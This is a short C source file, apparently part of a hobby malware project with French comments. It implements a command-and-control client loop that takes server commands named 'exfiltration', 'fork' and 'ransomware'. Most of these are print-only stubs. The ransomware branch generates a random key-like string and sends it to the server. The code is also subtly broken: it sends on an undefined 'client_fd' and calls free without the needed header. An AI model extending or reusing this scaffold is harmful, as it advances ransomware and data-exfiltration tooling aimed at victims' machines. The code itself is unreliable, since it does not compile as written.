#include "handle_client_commands.h"
#include "gener.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>

void handle_client_commands(int socket_fd)
{
    char buffer[BUFSIZ];
    int bytes_read;

    // Lire et traiter les commandes envoyées par le serveur
    while (1)
    {
        bytes_read = recv(socket_fd, buffer, BUFSIZ - 1, 0);
        if (bytes_read <= 0)
        {
            if (bytes_read == 0)
                printf("Server disconnected.\n");
            else
                perror("recv");
            break;
        }

        buffer[bytes_read] = '\0';
        printf("Server command received: \"%s\"\n", buffer);

        // Traiter les commandes spécifiques
        if (strcmp(buffer, "exfiltration") == 0)
        {
            printf("Executing exfiltration...\n");
            
        }
        else if (strcmp(buffer, "fork") == 0)
        {
            printf("Executing fork...\n");
        }
        else if (strcmp(buffer, "ransomware") == 0)
        {
            printf("Executing ransomware...\n");
            char *random_string = gener(16); // Générer une chaîne aléatoire de 16 caractères
            printf("Generated random string for exfiltration: %s\n", random_string);

            // Envoyer la chaîne générée au serveur
            send(client_fd, random_string, strlen(random_string), 0);
            free(random_string); // Libérer la mémoire allouée
        }
        else if (strcmp(buffer, "out") == 0)
        {
            printf("Executing out...\n");
        }
        else
        {
            printf("Unknown command received: \"%s\"\n", buffer);
        }
    }
}
